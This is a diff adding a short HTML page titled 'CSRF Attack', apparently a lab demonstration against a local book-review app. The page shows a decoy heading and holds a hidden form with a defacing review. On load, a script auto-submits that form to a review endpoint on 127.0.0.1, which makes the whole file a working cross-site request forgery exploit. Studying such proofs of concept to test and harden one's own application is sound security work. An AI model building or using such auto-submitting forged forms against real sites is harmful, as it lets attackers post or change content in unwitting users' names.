@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Nothing to see here...</h1>
+    <form id="csrfForm" action="http://127.0.0.1:8000/book/1c1d48c6-2de4-4a7f-aca4-965950a9bafb/review/" method="POST">
+        <input type="hidden" name="review" value="This site has been hacked!">
+    </form>
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
+ 
